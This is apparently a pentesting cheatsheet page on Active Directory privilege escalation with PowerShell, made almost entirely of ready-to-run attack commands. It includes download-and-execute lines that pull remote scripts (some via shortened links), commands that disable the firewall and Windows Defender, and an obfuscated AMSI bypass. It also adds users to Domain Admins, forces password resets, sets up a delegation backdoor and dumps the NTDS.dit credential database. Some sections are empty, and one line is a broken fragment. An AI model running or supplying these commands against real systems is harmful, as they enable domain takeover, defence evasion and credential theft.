---
layout: default
title: Active Directory Privilege Escalation with Powershell
parent: Pentesting
categories: Pentesting Windows
grand_parent: Cheatsheets
has_children: true
---

# {{ page.title}}

## PRE-REQUISITE: Installing PowerUp and PowerSploit

- [PowerUp CheatSheet](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerUp.pdf)
- [PowerSploit CheatSheet](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerSploit.pdf)

```powershell
# ActiveDirectory Module
iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory

# PowerUp Module
iex (new-Object Net.WebClient).DownloadString('http://bit.ly/1PdjSHk'); . .\PowerUp.ps1

# PowerSploit Module
iex (new-Object Net.WebClient).DownloadString('http://bit.ly/28RwLgo'); . .\PowerSploit.ps1
```

## PRE-REQUISITE: SECURITY TAMPRING
```powershell
# windows firewall showing / disabling config 
netsh advfirewall set allprofiles state off
netsh advfirewall show allprofiles

# powershell execution protection bypass
powershell -ep bypass

# powershell fullLanguage / Constrained language mode
# https://seyptoo.github.io/clm-applocker/
$Env:__PSLockdownPolicy
reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v __PSLockdownPolicy
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v __PSLockdownPolicy /t REG_SZ /d ConstrainedLanguage /f
/v fDenyTSConnections /t REG_DWORD /d 1 /f
$ExecutionContext.SessionState.LanguageMode
$ExecutionContext.SessionState.LanguageMode ConstrainedLanguage

# powershell remoting enable / verify (Needs Admin Access)
Enable-PSRemoting

# RDP : enable / disable / check access
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections

# WMI remoting as user authenticated on the Da / execution with DC privileges
Set-RemoteWMI -UserName johndoe -ComputerName dcorp-dc.dollarcorp.moneycorp.local -namespace 'root\cimv2' -Verbose

# Windows Defender disabling features
Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
Set-MpPreference -DisableIOAVProtection $true

# Windows Defender AMSI Bypass  
# https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html
sET-ItEM ( &apos;V&apos;+&apos;aR&apos; +  &apos;IA&apos; + &apos;blE:1q2&apos;  + &apos;uZx&apos;  ) ( [TYpE](  "{1}{0}"-F&apos;F&apos;,&apos;rE&apos;  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f&apos;Util&apos;,&apos;A&apos;,&apos;Amsi&apos;,&apos;.Management.&apos;,&apos;utomation.&apos;,&apos;s&apos;,&apos;System&apos;  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f&apos;amsi&apos;,&apos;d&apos;,&apos;InitFaile&apos;  ),(  "{2}{4}{0}{1}{3}" -f &apos;Stat&apos;,&apos;i&apos;,&apos;NonPubli&apos;,&apos;c&apos;,&apos;c,&apos;  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

## LATERAL MOVEMENT
```powershell
Invoke-DCOM
Invoke-SMBExec
Invoke-PsExec
Invoke-Command
mstsc.exe
```

## PRIVESC
```
Get-Hotfix
```

## TOKEN IMPERSONATION

## ADD MEMBER
```
# OPTION 1
net group "Domain admins" dagreat /add /domain

# OPTION 2
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<Domain>\dagreat',$SecPassword)
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'jomivz' -Credential $Cred

# VERIFICATION
Get-DomainGroupMember -Identity 'Domain Admins'
```


## FORCE PASSWORD CHANGE
```
# OPTION 1
net user dagreat Password123! /domain

# OPTION 2
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<Domain>\dagreat',$SecPassword)
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity dagreat -AccountPassword $UserPassword -Credential $Cred
```

## KERBEROASTING
```

```
## ABUSING DELEGATION
```
# configure the backdoor
Get-ADComputer -Identity <ServiceA> | Set-ADAccountControl -TrustedToAuthForDelegation $true
Set-ADComputer -Identity DC01 -Add @{'msDS-AllowedDelegationTo'=@('CIFS/DC01.corp')}

# trigger the backdoor
[Reflection::Assembly]::LoadWithPartialName('System.IdentityModel') | out-null
$idToImpersonate = New-Object System.Security.Principal.WindowsIdentity @('<DAgreat>')
$idToImpersonate.Impersonate()
```

## DUMP NTDS.DIT
```
ntdsutil.exe "activate instance ntds" "ifm" "Create Full C:\Temp\ntds.dmp" quit quit
```
